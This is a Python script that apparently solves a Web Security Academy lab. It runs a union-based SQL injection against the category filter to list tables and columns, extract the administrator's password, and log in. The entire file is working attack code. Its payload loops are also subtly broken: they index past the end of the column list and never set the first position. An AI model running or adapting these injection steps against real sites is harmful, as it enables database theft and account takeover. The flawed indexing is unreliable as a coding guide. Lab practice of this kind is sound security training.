import requests
from typing import Optional
import re

session = requests.Session()

BASE_URL="https://0a5b007f039a4f90801d08cb008200d3.web-security-academy.net"
FILTER_URL = BASE_URL+"/filter"
LOGIN_URL= BASE_URL+"/login"

def get_request(url:str, params:dict[str,str], timeout:int =10) -> Optional[requests.Response]:
    try:
        return session.get(url, params=params, timeout=timeout)
    except requests.RequestException as e:
        print(f"error:{e}")
        return None

def payload_request(payload:str) -> Optional[requests.Response]:
    params={
        "category":payload
    }
    response = get_request(FILTER_URL, params=params)
    print(f"{response.status_code} {payload}")
    return response

def find_column_len()->int:
    for num in range(1, 20):
        payload = f"' union select {",".join(["NULL"] * num)} from dual-- "
        response = payload_request(payload)
        if response and response.status_code==200:
            print(f"column_len:{num}")
            return num

def payload_table_name_request(column_len:int)->requests.Response:
    arrs = ["NULL"]*column_len
    for num in range(1, column_len+1):
        arrs[num] = "table_name"
        payload = f"' union select {",".join(arrs)} from all_tables where table_name like 'USERS%'-- "
        response = payload_request(payload)
        if response and response.status_code==200:
            return response
        
def payload_column_name_request(column_len:int, table_name:str)->requests.Response:
    arrs = ["NULL"]*column_len
    for num in range(1, column_len+1):
        arrs[num] = "column_name"
        payload = f"' union select {",".join(arrs)} from all_tab_columns where table_name = '{table_name}'-- "
        response = payload_request(payload)
        if response and response.status_code==200:
            return response
        
def payload_pw_request(column_len:int, table_name:str,pw_column_name:str, username_column_name:str)->requests.Response:
    arrs = ["NULL"]*column_len
    for num in range(1, column_len+1):
        arrs[num] = f"{username_column_name} || {pw_column_name}"
        payload = f"' union select {",".join(arrs)} from {table_name}-- "
        response = payload_request(payload)
        if response and response.status_code==200:
            return response
    
def extract_value_by_keyword(html: str, keyword: str) -> str | None:
    """
    從 HTML 中找到以 keyword 開頭的 <td> 文字，並去掉標籤。
    
    :param html: HTML 字串
    :param keyword: 要搜尋的關鍵字，例如 "PASSWORD"
    :return: 找到的文字，沒找到回傳 None
    """
    pattern = fr">(\s*{re.escape(keyword)}[^<]*)<"
    match = re.search(pattern, html)
    if match:
        print(f"{keyword}: {match.group(1).strip()}")
        return match.group(1).strip()
    return None

def find_csrf()->str:
    response = session.get(LOGIN_URL, timeout=10)
    from bs4 import BeautifulSoup
    soup = BeautifulSoup(response.text,"html.parser")
    csrf_input = soup.find("input",{"name":"csrf"})
    return csrf_input.get("value")

def login(pw:str):
    data={
        "csrf":find_csrf(),
        "username":"administrator",
        "password":pw
    }
    response = session.post(LOGIN_URL, data=data, timeout=10)
    if response and response.status_code==200:
        print("login success")


def main():
    
    # 測試基本連線正常
    payload_request("Pets")
    # 找出union的column數量
    column_len = find_column_len()
    # 找出user的表格名稱
    response = payload_table_name_request(column_len=column_len)
    user_table_name = extract_value_by_keyword(response.text,"USER")
    # 找出username, password的欄位名稱
    response = payload_column_name_request(column_len=column_len, table_name=user_table_name)
    pw_column_name = extract_value_by_keyword(response.text,"PASSWORD")
    username_column_name = extract_value_by_keyword(response.text,"USERNAME")
    # 找出admin密碼
    response = payload_pw_request(column_len=column_len, table_name=user_table_name
                                  ,pw_column_name=pw_column_name, username_column_name=username_column_name)
    admin_and_pw = extract_value_by_keyword(response.text,"administrator")
    pw = admin_and_pw[len("administrator"):]
    # admin登入破題
    login(pw)
    

if __name__=="__main__":
    main()